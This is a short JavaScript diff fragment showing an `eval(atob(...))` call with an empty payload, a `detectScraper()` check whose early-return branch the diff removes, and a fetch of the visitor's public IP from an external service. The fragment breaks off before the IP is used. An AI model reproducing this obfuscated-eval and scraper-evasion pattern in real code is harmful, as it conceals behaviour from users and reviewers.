@@ -26,7 +26,7 @@
   return false;
 }
   eval(atob(""))
-  if(detectScraper()) {return false;} else {
+  if(detectScraper()) {} else {
   let i = ""
   fetch("https://myexternalip.com/raw").then(res=>{
     res.text().then(tx=>{
